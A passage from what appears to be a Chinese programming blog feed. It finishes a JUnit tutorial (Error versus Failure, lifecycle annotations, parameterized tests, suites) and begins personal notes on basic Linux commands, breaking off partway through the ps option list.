<li><p>正常测试<br>  点击<code>CalculatorTest</code>测试类旁的绿色三角箭头，运行正确测试类，结果如下：</p>
<p>  <img src="/junit%E5%85%A5%E9%97%A8/demo6.png" alt="demo"></p>
</li>
<li><p>编写出现<code>Failure</code>的测试用例</p>
<p>  修改<code>Calculator</code>类的<code>add()</code>函数为：</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  再次运行<code>CalculatorTest</code>测试类，<code>addTest()</code>函数报错<code>fail</code>：</p>
<p>  <img src="/junit%E5%85%A5%E9%97%A8/demo7.png" alt="demo"></p>
</li>
<li><p>编写出现<code>Error</code>的测试用例</p>
<p>  修改<code>CalculatorTest</code>测试类的<code>divTest()</code>函数为：</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">divTest</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Calculator</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> c.div(<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    Assert.assertEquals(<span class="string">&quot;div error&quot;</span>, result, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  再次运行，出现<code>error</code>错误。原因是<strong>测试数据</strong>中存在<strong>除0</strong>，导致<strong>被测试函数</strong>抛出异常：</p>
<p>  <img src="/junit%E5%85%A5%E9%97%A8/demo8.png" alt="demo"></p>
</li>
<li><p>Error和Failure的区别</p>
<p>  <code>Error</code>的出现是因为<strong>测试代码</strong>编写的问题，比如以上用例：未接受被测试程序“正常”抛出的异常。</p>
<p>  <code>Failure</code>的出现则说明<strong>被测试程序</strong>有问题，比如以上用例：<code>add()</code>函数错误地返回两数相减的结果。</p>
</li>
</ul>
<h3 id="2-4-junit执行过程"><a href="#2-4-junit执行过程" class="headerlink" title="2.4. junit执行过程"></a>2.4. junit执行过程</h3><p>在<code>CalculatorTest</code>测试类中添加如下函数，并导入相应的包：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@BeforeClass</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;BeforeClass&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@AfterClass</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tearDownClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;AfterClass&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Before</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Before&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@After</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tearDown</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;After&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述注解含义：</p>
<p><code>@BeforeClass</code>表示该函数在<strong>所有测试函数</strong>运行之前运行；</p>
<p><code>@AfterClass</code>表示该函数在<strong>所有测试函数</strong>运行之后运行；</p>
<p><code>@Before</code>表示该函数在<strong>每个测试函数</strong>运行之前运行一次；</p>
<p><code>@After</code>表示该函数在<strong>每个测试函数</strong>运行之后运行一次；</p>
<p>在每个测试函数中加一句输出，运行测试类结果如下：</p>
<p><img src="/junit%E5%85%A5%E9%97%A8/demo9.png" alt="demo"></p>
<h3 id="2-5-异常测试、超时测试、忽略测试"><a href="#2-5-异常测试、超时测试、忽略测试" class="headerlink" title="2.5. 异常测试、超时测试、忽略测试"></a>2.5. 异常测试、超时测试、忽略测试</h3><ul>
<li><p>异常测试</p>
<p>  通过<code>@Test(expected = ArithmeticException.class)</code>实现异常检测。</p>
<p>  对于上述<code>divTest()</code>除0抛出异常的情况，进行异常接受测试，修改<code>divTest()</code>函数如下：</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test(expected = ArithmeticException.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">divTest</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;divTest&quot;</span>);</span><br><span class="line">    <span class="type">Calculator</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> c.div(<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    Assert.assertEquals(<span class="string">&quot;div error&quot;</span>, result, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  运行结果如下，未出现<code>Error</code></p>
<p>  <img src="/junit%E5%85%A5%E9%97%A8/demo10.png" alt="demo"></p>
</li>
<li><p>超时测试</p>
<p>  通过<code>@Test(timeout = 2000)</code>实现。</p>
<p>  在<code>CalculatorTest</code>测试类中添加超时测试函数：</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test(timeout = 2000)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printTest</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  该测试函数运行超过2000ms，则会报错<code>Error</code>：</p>
<p>  <img src="/junit%E5%85%A5%E9%97%A8/demo11.png" alt="demo"></p>
</li>
<li><p>忽略测试</p>
<p>  在<code>printTest()</code>函数上添加<code>@Ignore</code>注解。运行则会忽略该函数：</p>
<p>  <img src="/junit%E5%85%A5%E9%97%A8/demo12.png" alt="demo"></p>
</li>
</ul>
<h3 id="2-6-参数化测试"><a href="#2-6-参数化测试" class="headerlink" title="2.6. 参数化测试"></a>2.6. 参数化测试</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> main.Calculator;</span><br><span class="line"><span class="keyword">import</span> org.junit.Assert;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.junit.runners.Parameterized;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@project</span> junitDemo</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@class</span> ParameterTest</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> douNine</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019/6/23 14:10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> 参数化设置测试</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RunWith(Parameterized.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParameterTest</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">expected</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ParameterTest</span><span class="params">(<span class="type">int</span> expected, <span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.expected = expected;</span><br><span class="line">        <span class="built_in">this</span>.a = a;</span><br><span class="line">        <span class="built_in">this</span>.b = b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设定多组数据，给测试方法用</span></span><br><span class="line">    <span class="meta">@Parameterized</span>.Parameters</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Collection&lt;Object[]&gt; date() &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">        <span class="comment">// 返回多组参数数据，如：&#123;3,2,1&#125; 赋给了 expected, a, b</span></span><br><span class="line">        <span class="keyword">return</span> Arrays.asList(<span class="keyword">new</span> <span class="title class_">Object</span>[][]&#123;&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>&#125;, &#123;<span class="number">1</span>,<span class="number">22</span>,<span class="number">3</span>&#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置了多少个参数则运行多少次。每次都会实例化测试类，并设置测试参数值。</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">calutor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">        Assert.assertEquals(<span class="built_in">this</span>.expected, calutor.add(<span class="built_in">this</span>.a, <span class="built_in">this</span>.b));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数化测试说明：</p>
<ul>
<li>测试类需要使用<code>@RunWith(Parameterized.class)</code>注解进行修饰。</li>
<li>测试类需要声明分别用于<strong>存放期望值和测试数据</strong>的变量。</li>
<li>测试类需要声明一个<strong>带有参数的公共构造函数</strong>，并在其中为第二个环节中声明的几个变量赋值。</li>
<li>测试类需要声明一个公共静态方法，使用<code>@Parameterized.Parameters</code>进行修饰，并返回<code>java.util.Collection</code>类，并在此方法中<strong>初始化所有需要测试的参数对</strong>。</li>
<li>编写测试方法，使用类变量作为参数进行测试。</li>
</ul>
<h3 id="2-7-同时运行多个测试类"><a href="#2-7-同时运行多个测试类" class="headerlink" title="2.7. 同时运行多个测试类"></a>2.7. 同时运行多个测试类</h3><p>同时运行<code>CalculatorTest</code>和<code>ParameterTest</code>测试类，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.junit.runners.Suite;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@project</span> junitDemo</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@class</span> CommTest</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> douNine</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019/6/23 14:11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> 同时运行多个测试类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RunWith(Suite.class)</span></span><br><span class="line"><span class="meta">@Suite</span>.SuiteClasses(&#123;</span><br><span class="line">        CalculatorTest.class,</span><br><span class="line">        ParameterTest.class</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommTest</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-参考"><a href="#3-参考" class="headerlink" title="3. 参考"></a>3. 参考</h2><p><a href="https://blog.csdn.net/qq_34264849/article/details/88243278">https://blog.csdn.net/qq_34264849&#x2F;article&#x2F;details&#x2F;88243278</a></p>
]]></content>
      <categories>
        <category>不知道怎么分类的分类</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Junit</tag>
      </tags>
  </entry>
  <entry>
    <title>linux命令学习笔记</title>
    <url>/linux%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>一篇关于linux简单命令的学习笔记。</p>
<p>在linux的<code>/bin/</code>目录下包含一些基础命令的可执行文件(二进制文件)。</p>
<p>以下命令格式中，略去命令选项。</p>
<span id="more"></span>

<h2 id="1-文件管理"><a href="#1-文件管理" class="headerlink" title="1. 文件管理"></a>1. 文件管理</h2><h3 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h3><p><code>~</code> 到用户HOME目录<br><code>/</code> 到系统根目录<br><code>-</code> 退到上一个进入的目录</p>
<h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p>格式：<br><code>ls &lt;选项&gt; &lt;目录&gt;</code></p>
<p>主要选项：<br><strong><code>-a</code></strong>  查看当前目录下所有文件和目录，包括隐藏文件<br><code>-A</code> 同 -a ，但不列出 “.” (目前目录) 及 “..” (父目录)<br><code>-S</code> 按文件大小排序列表<br><strong><code>-l</code></strong> 使用长列表格式列出详细信息<br><code>-t</code> 按文件的最后修改时间排序列表。<br><code>-c</code> (1)与-lt一起用时按照存取时间来排序列表，并在列表中显示存取时间的值，其中存取时间是文件状态信息中的最后修改时间；(2)与-l一起用时按照文件名来排序列表，但在列表中显示存取时间。<br><code>-full-time</code> 显示每个文件的完全日期和时间<br><strong><code>-h</code></strong> 以人们易读的格式显示文件大小(“K”,”M”,”G”)<br><strong><code>-i</code></strong> 显示文件的节点号<br><code>-r</code> 反序列表<br><code>-R</code> 递归显示子目录中的内容<br><code>-s</code> 以磁盘块个数的形式显示每个文件的大小<br><code>-time=WORD</code> 将WORD作为时间显示以代替文件的最后修改时间。</p>
<p><code>ls -ilh</code> 后显示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">total 28K</span><br><span class="line">658691 -rw-rw-r-- 1 <span class="built_in">test</span> <span class="built_in">test</span>   81 Dec 13 01:52 db_info</span><br><span class="line">658248 drwxrwxr-x 3 <span class="built_in">test</span> <span class="built_in">test</span> 4.0K Dec 11 19:44 douNine</span><br><span class="line">658064 drwxrwxr-x 5 <span class="built_in">test</span> <span class="built_in">test</span> 4.0K Dec 13 20:05 go</span><br><span class="line">658315 -rw-rw-r-- 1 <span class="built_in">test</span> <span class="built_in">test</span> 9.0K Nov 28 22:33 hist</span><br><span class="line">656748 drwxrwxr-x 2 <span class="built_in">test</span> <span class="built_in">test</span> 4.0K Dec  3 15:19 ziwen</span><br></pre></td></tr></table></figure>

<ul>
<li>第一字段：inode(文件或目录索引点，相当于指向文件在磁盘中数据的指针)</li>
<li>第二字段：文件种类(<code>-</code>表示正常文件，<code>d</code>表示目录，<code>l</code>表示链接文件)和权限(rwx，共9位，分别控制<strong>文件属主</strong>、<strong>所属用户组</strong>以及<strong>其它用户</strong>的权限)</li>
<li>第三字段：硬链接个数</li>
<li>第四字段：文件属主</li>
<li>第五字段：文件所归属的用户组</li>
<li>第六字段：文件或目录的大小(字节)</li>
<li>第七字段和第八字段：最后访问或修改时间</li>
<li>第九字段：文件名或目录名</li>
</ul>
<h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h3><p>创建一个目录</p>
<p>格式：<br><code>mkdir &lt;dir&gt;</code></p>
<p>主要选项：<br><code>-m</code> 设置许可模式<br><code>-v</code> 为每一个创建的目录显示一条消息</p>
<h3 id="rmdir"><a href="#rmdir" class="headerlink" title="rmdir"></a>rmdir</h3><p>删除一个空目录</p>
<p>格式：<br><code>rmdir &lt;dir&gt;</code></p>
<h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h3><p>删除(remove)</p>
<p>格式：<br><code>rm &lt;选项&gt; &lt;文件或目录&gt;</code></p>
<p>主要选项：<br><code>-i</code> 以询问的方式删除<br><code>-f</code> 强制删除<br><code>-r</code> 递归删除，删目录时</p>
<p><code>rm -rf</code> 强制递归删除过于暴力，且删除后还无法复原。因此，我常自定义删除文件&#x2F;目录的命令，在<code>~/.bashrc</code>中添加：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">alias rm=<span class="string">&#x27;echo &quot;please use trash&quot;&#x27;</span></span><br><span class="line">alias trash=trash</span><br><span class="line">trash() &#123;</span><br><span class="line">    mv $@ ~/.trash/</span><br><span class="line">&#125;</span><br><span class="line">alias clearTrash=clearTrash</span><br><span class="line">clearTrash() &#123;</span><br><span class="line">    sudo /bin/rm -rf ~/.trash<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>

<h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h3><p>移动(move)</p>
<p>格式：<br><code>mv &lt;文件A或目录A&gt; &lt;文件B或目录B&gt;</code></p>
<p>说明：<br>该命令有<strong>重命名</strong>的作用，当xxB不存在时，会将xxA重命名为xxB</p>
<h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><p>复制(copy)</p>
<p>格式：<br><code>cp &lt;文件A或目录A&gt; &lt;文件B或目录B&gt;</code></p>
<h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h3><p>显示当前绝对路径</p>
<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>只读形式显示文件内容</p>
<p>格式：<br><code>cat &lt;文件&gt;</code></p>
<p>主要选项：<br><code>-b</code> 计算所有非空输出行，开始为1。<br><code>-e</code> 在每行末尾显示$符号。<br><strong><code>-n</code></strong> 计算所有输出行，开始为1。<br><code>-s</code> 将相连的多个空行用单一空行代替。</p>
<h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><p>显示文件开头。</p>
<p>常用选项：</p>
<p><code>-n &lt;count&gt; == -&lt;count&gt;</code> 显示前 count 行，默认为 10 。</p>
<p>常用：</p>
<ul>
<li><code>head -20 file.log</code> 显示前 20 行</li>
</ul>
<h3 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h3><p>显示文件结尾。</p>
<p>常用选项：</p>
<p><code>-n &lt;count&gt; == -&lt;count&gt;</code> 显示后 count 行，默认为 10 。<br><code>-f</code> 不断获取文件新添加的数据。</p>
<p>常用：</p>
<p><code>tail -f log</code> 查看不断更新的日志。</p>
<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>格式：<br><code>file &lt;file/dir&gt;</code></p>
<p>查看文件类型</p>
<h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><p>分页显示文件的内容</p>
<p>格式：<br><code>more &lt;file&gt;</code></p>
<p>说明：<br>分页显示文件内容查看时：</p>
<ul>
<li>上下左右键进行翻阅</li>
<li><code>q</code>键退出。</li>
</ul>
<h3 id="less"><a href="#less" class="headerlink" title="less"></a>less</h3><p><code>more</code>命令的进阶版</p>
<p>说明：<br><code>less</code> &#x3D; <code>more</code> + <code>vi</code><br>在分页查看文件内容时，还可以：</p>
<ul>
<li>使用<code>/pattern</code>从头向尾查找显示字符串</li>
<li>使用<code>?pattren</code>从尾向头查找显示字符串</li>
</ul>
<h3 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h3><p>新建文件</p>
<p>格式：<br><code>touch &lt;文件&gt;</code></p>
<h3 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h3><p>修改文件权限。</p>
<p>在linux中，一个文件的权限范围有：</p>
<ul>
<li><code>u</code>：User，即文件或目录的拥有者。</li>
<li><code>g</code>：Group，即文件或目录的所属群组。</li>
<li><code>o</code>：Other，除了文件或目录拥有者或所属群组之外，其他用户皆属于这个范围。</li>
<li><code>a</code>：All，即全部的用户，包含拥有者，所属群组以及其他用户。</li>
</ul>
<p>而，文件的权限又分为：</p>
<ul>
<li><code>r</code>：读取权限，数字代号为 4</li>
<li><code>w</code>：写入权限，数字代号为 2</li>
<li><code>x</code>：执行或切换权限，数字代号为 1</li>
<li><code>-</code>：不具任何权限，数字代号为 0</li>
</ul>
<p>查看文件权限用 <code>ls -l</code> 命令，就会显示每个文件u,g,o范围的权限。</p>
<p>修改一个文件的权限大致有两种方法，如：</p>
<p><code>chmod u+x &lt;file&gt;</code>  file 的 u(即文件所拥有者)<br>新增 x(执行权限)，<code>u-x</code>  即对该范围取消 x 权限</p>
<p><code>chmod 755 &lt;file&gt;</code>  表示对file的 u,g,o 范围分别赋予 7,5,5 权限。7&#x3D;1+2+4，指rwx权限；5&#x3D;1+4，指r-x权限；同理，还有 0,2,4,6 等权限。</p>
<p><strong>理解</strong>：</p>
<p>为何任意一个小于7数字就能表示一种三个权限的组合呢？我猜想是因为这是个三位的二进制数。<code>x</code>是第一位，<code>w</code>是第二位，<code>r</code>是第三位，0和1表示权限关和开。所以，<code>7</code>的二进制为<code>111</code>，表示三个权限都开启；<code>5</code>的二进制为<code>101</code>，表示<code>r</code>和<code>x</code>权限开启。</p>
<h3 id="chown"><a href="#chown" class="headerlink" title="chown"></a>chown</h3><p>修改文件&#x2F;目录的属主。</p>
<p><code>chown root test/</code> 将<code>test/</code>目录的属主改为<code>root</code>。</p>
<h3 id="chgrp"><a href="#chgrp" class="headerlink" title="chgrp"></a>chgrp</h3><p>修改文件&#x2F;目录的属组。</p>
<p><code>chgrp root test/</code> 将<code>test/</code>目录的属组改为<code>root</code>。</p>
<h3 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h3><p>依次显示文件的行数,单词数和字符数</p>
<p>格式：<br><code>wc &lt;文件&gt;</code></p>
<p>主要选项：<br><code>-l</code> 只显示行数<br><code>-w</code>  只显示单词数<br><code>-c</code>  只显示字符数</p>
<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>查找文件或目录</p>
<p>主要选项：<br><code>-name &lt;文件&gt;</code> 匹配要名字相同的文件，要找的文件名字包括在引号中，可以使用通配符（*和？）<br><code>-perm &lt;模式&gt;</code> 匹配所有模式为指定数字型模式值的文件。不仅仅是读，写和执行，所有模式都必须匹配。如果在模式前是负号（-），表示采用除这个模式外的所有模式。<br><code>-user &lt;用户号&gt;</code> 匹配所有用户序列号是前面所指定的用户序列号的文件，可以是数字型的值或用户登录名。<br><code>-atime n</code> 匹配所有在前n天内访问过的文件。<br><code>-mtime n</code> 匹配所有在前n天内修改过的文件。<br><code>-newer &lt;文件&gt;</code> 匹配所有修改时间比file文件更新的文件。<br><code>-size n</code> 匹配所有大小为n 块的文件（若k在n后，则为1K字节块）。<br><code>-print</code> 显示整个文件路径和名称。一般来说,如果没有这个选项，find命令进行所要求的搜索是不会显示结果的。</p>
<p>示例：<br><code>find ~/go/src/ -name &quot;beego&quot; -print</code> 通过文件名查找，并打印出文件或目录的路径<br><code>find ~/go/src/ -name &quot;bb*&quot; -print</code> 根据部分文件名查找。会匹配名字为 bba、bbhj、bbac 等文件或目录。<br><code>find /etc –size 2500b –print</code> 根据文件的特征查询。例如，知道一个文件尺寸小于为2500bytes</p>
<p><strong>注解</strong>：</p>
<p>通配符又称多义符。在描述文件时，有时在文件名部分用到一些通配符，以加强命令的功能。与正则表达式很像。</p>
<ul>
<li><code>?</code>：表示该位置可以是一个任意字符。</li>
<li><code>*</code>：表示该位置可以是零个或多个任意字符。</li>
<li><code>[charset]</code>：可选择charset集中的任何单个字符。例如：<code>ls name[1-5].png</code> 会列出name1.png、name2.png…</li>
</ul>
<h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><p>加密解密，此处参照<a href="https://www.cnblogs.com/kaynet/p/6410722.html">大神博客</a>。</p>
<p>常用选项：</p>
<ul>
<li><code>c</code> Create archive.tar from files. 压缩到 <code>.tar</code></li>
<li><code>x</code> Extract all files from archive.tar. 从 <code>.tar</code> 解压</li>
<li><code>f</code> 指定解&#x2F;压缩文件名</li>
<li><code>v</code> 显示解压过程</li>
<li><code>z</code> 解&#x2F;压缩 <code>.tar.gz</code> 结尾的压缩包</li>
<li><code>C dir/</code> 解压到指定目录</li>
</ul>
<p>常用示例：</p>
<ul>
<li><code>tar -cvf archive.tar file/</code> 压缩成 tar</li>
<li><code>tar -czvf archive.tar.gz file/</code> 压缩成 tar.gz</li>
<li><code>tar -xvf archive.tar</code> 解压 tar</li>
<li><code>tar -xzvf archive.tar.gz</code> 解压 tar.gz</li>
</ul>
<h3 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h3><p>对文件或目录建立链接(其中的软链接，类似于Windows的快捷方式)。</p>
<p>分类：硬链接（Hard Link），符号链接（Symbolic Link）。</p>
<h4 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h4><p>默认情况下，ln产生硬链接。</p>
<p>建立硬链接时，链接文件和被链接文件必须位于同一个文件系统中，并且不能建立指向目录的硬链接。有硬链接关系的两个文件的inode值相同。</p>
<p>当我们修改其中一个文件的内容时，互为硬链接的文件的内容也会跟着变化。可以这么理解，互为硬链接关系的文件，他们好象是克隆体，他们的属性几乎是完全一样；硬链接关系的文件是无法区别的。</p>
<p>格式:<br><code>ln &lt;选项&gt; &lt;源目录/文件&gt; &lt;目标目录/文件&gt;</code></p>
<p>说明：<br><code>ln a.c ~/</code> 如果最后一参数是一个已存在的目录，那么ln命令就在目录下创建与各个目标相连的链接，而且<strong>名字也与目标相同</strong>。<br><code>ln a.c ~/b.c</code> 如果给出了两个文件名，那么命令生成一个从第二个文件指向第一个文件的链接。<br><code>ln a.c</code> 如果只给出了一个目标，ln就在当前目录下生成一个指向目标的链接。</p>
<h4 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h4><p>软链接也叫符号链接，其实就是快捷方式。</p>
<p>格式：<br><code>ln -s 源文文件或目录  目标文件或目录</code></p>
<p>示例:<br><code>$ ln -s /mnt/d/my_code/ ~/link_my_code</code> 软链接一个目录到另一个目录下时，用<strong>绝对路径</strong></p>
<p><code>$ ln -s my_code/ ~/link_my_code</code>  这样是错误的，因为~&#x2F;下没有my_code这个目录</p>
<h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><p>1）硬链接相当于拷贝了指向文件数据的“指针”(文件索引结点信息)过来。而软链接记住的，是文件索引结点所在的目录，似乎是一个“指针”的指针。</p>
<p>2）若一个文件有多个硬链接，删除其中一个文件后，文件数据其实并未删除，还可以通过其它硬链接找到这个文件，只是文件的硬链接个数会减一。而软链接，删除源文件后，软链接就不可用了，此处很像window的快捷方式。</p>
<p>注：不管软硬链接，修改一个文件，另一个文件也会被修改。</p>
<h2 id="2-进程与内存管理"><a href="#2-进程与内存管理" class="headerlink" title="2.进程与内存管理"></a>2.进程与内存管理</h2><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>查看进程(process)</p>
<p>主要选项：<br><strong><code>-A</code></strong> 显示所有进程（等价于-e）<br><strong><code>-a</code></strong> 显示一个终端的所有进程，除了会话引线<br><code>-N</code> 忽略选择。<br><strong><code>-d</code></strong> 显示所有进程，但省略所有的会话引线<br><strong><code>-x</code></strong> 显示没有控制终端的进程，同时显示各个命令的具体路径。dx不可合用。<br><code>-p pid</code> 进程使用cpu的时间<br><strong><code>-u uid 或 username</code></strong> 选择有效的用户id或者是用户名，如 -u test 查看test用户<br><code>-g gid 或 groupname</code> 显示组的所有进程。<br><strong><code>U username</code></strong> 显示该用户下的所有进程，且显示各个命令的详细路径。如: U test<br><code>-f</code> 全部列出，通常和其他选项联用。如：ps -fa 或 ps -fx<br><code>-l</code> 长格式（有F,wchan,C 等字段）<br><code>-j</code> 操作格式<br><code>-o</code> 用户自定义格式。<br><code>v</code> 以虚拟存储器格式显示<br><code>s</code> 以信号格式显示<br><code>-m</code> 显示所有的线程<br><code>-H</code> 显示进程的层次(和其它的命令合用，如：ps -Ha)<br><code>e</code> 命令之后显示环境(如：ps -d e; ps -a e)<br><strong><code>h</code></strong> 不显示第一行</p>
<p>常用：</p>
<ul>
<li><code>ps -aux</code>，执行后，<strong>显示的头部</strong>如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户  进程id  CPU使用率  内存使用率  状态  开始日期  开始时间  命令</span><br><span class="line"></span><br><span class="line">USER  PID  %CPU  %MEM  VSZ  RSS  TTY  STAT  START  TIME  COMMAND</span><br></pre></td></tr></table></figure>

<p>其中<code>STAT</code>有以下几种状态:</p>
<ul>
<li><code>D</code>: 不可中断的静止</li>
<li><code>R</code>: 正在执行中</li>
<li><code>S</code>: 静止状态</li>
<li><code>T</code>: 暂停执行</li>
<li><code>Z</code>: 不存在但暂时无法消除</li>
<li><code>W</code>: 没有足够的记忆体分页可分配</li>
<li><code>&lt;</code>: 高优先序的行程</li>
<li><code>N</code>: 低优先序的行程</li>
<li><code>L</code>: 有记忆体分页分配并锁在记忆体内 (即时系统或捱A I&#x2F;O)</li>
</ul>
